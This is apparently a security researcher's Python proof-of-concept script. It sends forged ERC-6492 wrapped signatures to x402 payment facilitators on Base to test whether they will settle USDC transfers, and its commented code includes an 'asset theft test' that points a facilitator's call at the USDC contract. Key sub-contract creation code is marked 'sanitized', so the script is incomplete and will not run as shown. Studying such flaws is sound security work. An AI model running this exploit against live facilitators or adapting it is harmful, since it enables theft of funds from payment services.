from simplebase import *


def run(target_name=None):
    import os
    if target_name:
        os.environ["TARGET"] = target_name

    import argparse
    import config, secrets, os
    from target import current_target

    config.privatekey = config.pk1
    MYADDR = topub(config.pk1)

    p = argparse.ArgumentParser(description="ERC-6492 settle/verify test (x402 v2 payload)")
    p.add_argument("-t", "--target", help="target name from target.py (defaults to target.DEFAULT_TARGET)")
    args = p.parse_args()

    CHAIN_PRESETS = {
        "base": {
            "chainid": 8453,
            "usdc": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
            "usdc_name": "USD Coin",
            "usdc_version": "2",
            "endpoints": [
                "https://mainnet.base.org",
                "https://base.public.blockpi.network/v1/rpc/public",
                "https://base-rpc.publicnode.com",
            ],
            "contract": "",
        },
        "base-sepolia": {
            "chainid": 84532,
            "usdc": "0x036CbD53842c5426634e7929541eC2318f3dCF7e",
            "usdc_name": "USDC",
            "usdc_version": "2",
            "endpoints": [
                "https://base-sepolia.drpc.org",
                "https://sepolia.base.org",
                "https://base-sepolia-rpc.publicnode.com",
            ],
            "contract": "0x2369445E49B1b197263ab98BfC4E2810091A4525",
        },
    }

    tgt = current_target(args.target)
    chain_key = tgt.network
    if chain_key not in CHAIN_PRESETS:
        raise SystemExit(f"Unsupported network '{chain_key}' for 6492 test")
    chain_cfg = CHAIN_PRESETS[chain_key]

    AMT = tgt.pay_amount
    FACILITATOR = "coinbase" if tgt.name == "coinbase" else tgt.facilitator_base
    CHAINID = chain_cfg["chainid"]
    CAIP_NETWORK = f"eip155:{CHAINID}"
    USDC = chain_cfg["usdc"]
    USDC_NAME = chain_cfg["usdc_name"]
    USDC_VERSION = chain_cfg["usdc_version"]
    CONTRACT = os.getenv("CONTRACT", chain_cfg["contract"])
    if not CONTRACT:
        raise SystemExit("Missing ERC-6492 factory CONTRACT; set CONTRACT=0x...")

    p = Endpoint_Provider(chain_cfg["endpoints"])

    base_headers = {}
    if "thirdweb" in tgt.name:
        try:
            base_headers["x-secret-key"] = config.ThirdWeb_Secret_key
        except Exception as exc:
            raise SystemExit("thirdweb target requires ThirdWeb_Secret_key in config.py") from exc

    def _resolve_action_endpoint(action: str) -> tuple[str, dict]:
        assert action in {"verify", "settle"}
        local_headers = dict(base_headers)
        if FACILITATOR == "coinbase":
            from config import CDP_API_KEY_ID, CDP_API_KEY_SECRET
            from cdp.x402 import create_facilitator_config
            import asyncio

            facilitator_config = create_facilitator_config(
                api_key_id=CDP_API_KEY_ID,
                api_key_secret=CDP_API_KEY_SECRET,
            )
            local_headers.update(asyncio.run(facilitator_config["create_headers"]())[action])
            return facilitator_config["url"] + "/" + action, local_headers

        url = FACILITATOR
        if not url.endswith("/" + action):
            if not url.endswith("/"):
                url += "/"
            url += action
        return url, local_headers

    def _shorten(value, limit=700):
        text = str(value)
        if len(text) <= limit:
            return text
        return text[:limit] + f"... <truncated {len(text) - limit} chars>"

    def _print_request_summary(action, url, data):
        req = data.get("paymentRequirements", {})
        payload = data.get("paymentPayload", {})
        auth = payload.get("payload", {}).get("authorization", {})
        sig = payload.get("payload", {}).get("signature", "")
        print(f"{action} url:", url)
        print(f"{action} request summary:", {
            "x402Version": data.get("x402Version"),
            "network": req.get("network"),
            "asset": req.get("asset"),
            "amount": req.get("amount"),
            "payTo": req.get("payTo"),
            "from": auth.get("from"),
            "to": auth.get("to"),
            "value": auth.get("value"),
            "signature_prefix": sig[:40] + ("..." if len(sig) > 40 else ""),
        })

    def _print_response_summary(action, response):
        content_type = response.headers.get("content-type", "")
        print(f"{action} response:", response, "content-type:", content_type)
        try:
            body = response.json()
            print(f"{action} response json:", body)
            return
        except Exception:
            pass
        text = response.text or ""
        if "text/html" in content_type.lower() or text.lstrip().lower().startswith("<!doctype html") or "<html" in text[:200].lower():
            title = ""
            low = text.lower()
            if "<title>" in low and "</title>" in low:
                start = low.find("<title>") + len("<title>")
                end = low.find("</title>", start)
                title = text[start:end].strip()
            print(f"{action} response html suppressed; body_len={len(text)}; title=", _shorten(title, 300) if title else "<none>")
        else:
            print(f"{action} response text:", _shorten(text, 1200))

    def _build_v2_request(pk, payto, payamount, validwindow=60):
        ts = int(time.time())
        nonce_bytes = secrets.token_bytes(32)
        if isinstance(pk, dict):
            sendfrom = pk["from"]
        else:
            sendfrom = topub(pk)

        typed_data = {
            "types": {
                "TransferWithAuthorization": [
                    {"name": "from", "type": "address"},
                    {"name": "to", "type": "address"},
                    {"name": "value", "type": "uint256"},
                    {"name": "validAfter", "type": "uint256"},
                    {"name": "validBefore", "type": "uint256"},
                    {"name": "nonce", "type": "bytes32"},
                ]
            },
            "primaryType": "TransferWithAuthorization",
            "domain": {
                "name": USDC_NAME,
                "version": USDC_VERSION,
                "chainId": CHAINID,
                "verifyingContract": USDC,
            },
            "message": {
                "from": sendfrom,
                "to": payto,
                "value": payamount,
                "validAfter": ts - validwindow,
                "validBefore": ts + validwindow,
                "nonce": nonce_bytes,
            },
        }
        if isinstance(pk, dict):
            sig = pk["sign"](typed_data)
        else:
            sig = sign_eip712(typed_data, pk)

        requirements = {
            "scheme": "exact",
            "network": CAIP_NETWORK,
            "asset": USDC,
            "amount": str(payamount),
            "payTo": payto,
            "maxTimeoutSeconds": 60,
            "extra": {
                "name": USDC_NAME,
                "version": USDC_VERSION,
            },
        }
        payload = {
            "x402Version": 2,
            "resource": {
                "url": tgt.needpay_url,
                "description": "",
                "mimeType": "",
            },
            "accepted": requirements,
            "payload": {
                "signature": sig,
                "authorization": {
                    "from": sendfrom,
                    "to": payto,
                    "value": str(payamount),
                    "validAfter": str(ts - validwindow),
                    "validBefore": str(ts + validwindow),
                    "nonce": b16e(nonce_bytes),
                },
            },
        }
        return {
            "x402Version": 2,
            "paymentPayload": payload,
            "paymentRequirements": requirements,
        }

    def x402_transfer_usdc_v2(pk, payto, payamount, action="settle"):
        url, headers = _resolve_action_endpoint(action)
        data = _build_v2_request(pk, payto, payamount)
        _print_request_summary(action, url, data)
        x = sess.post(url, json=data, headers=headers)
        _print_response_summary(action, x)
        try:
            return x.json()
        except Exception:
            return {"http_status": x.status_code, "text": x.text}

    print("FACILITATOR:", FACILITATOR)
    print("AMT:", AMT)
    print("NETWORK:", CAIP_NETWORK)
    print("CONTRACT:", CONTRACT)
    print("MYADDR:", MYADDR)
    print("my usdc bal:", p.callfunction(USDC, "balanceOf(address)", toarg(MYADDR)) / 1e6)

    if "SALT" in os.environ:
        salt = bd(os.environ["SALT"])
    else:
        salt = secrets.token_bytes(32)

    print(f"SALT={b16e(salt)}")
############### Create Sub-contract Code Start#################################
# sanitized
############### Create Sub-contract Code End#################################
    print("sub:", sub)

    contractbal = p.erc20_balanceOf(USDC, sub)
    print("contract bal:", contractbal / 1e6)
    needed = max(0, AMT - contractbal)
    if needed > 0:
        print(f"funding sub with {needed / 1e6} USDC")
        x = x402_transfer_usdc_v2(config.pk1, sub, needed, action="settle")
        print("fund result:", x)
    else:
        print("sub has enough balance, skip funding")


############### Create Sub-contract Code Start#################################
    # sanitized
    # ERC-6492 contract deployment test
    # to = CONTRACT
    # cd = ""

    # ERC-6492 asset theft test
    # to = USDC
    # cd = ""
    # to = MYADDR
    # cd = " "
############### Create Sub-contract Code End#################################

    ## Generate Signature
    sig = "0x" + ec(["address", "bytes", "bytes"], [CONTRACT, bd(cd), bd("11" * 131)]) + "6492649264926492649264926492649264926492649264926492649264926492"
    print("sig:")
    print(sig)

    signer = {"from": sub, "sign": lambda _typed_data: sig}

    y = x402_transfer_usdc_v2(signer, MYADDR, AMT, action="verify")
    print("verify1 result:", y)

    x = x402_transfer_usdc_v2(signer, MYADDR, AMT, action="settle")
    print("settle result:", x)

    if not x.get("success"):
        y = x402_transfer_usdc_v2(signer, MYADDR, AMT, action="verify")
        print("verify2 result:", y)


def main():
    run()


if __name__ == "__main__":
    main()
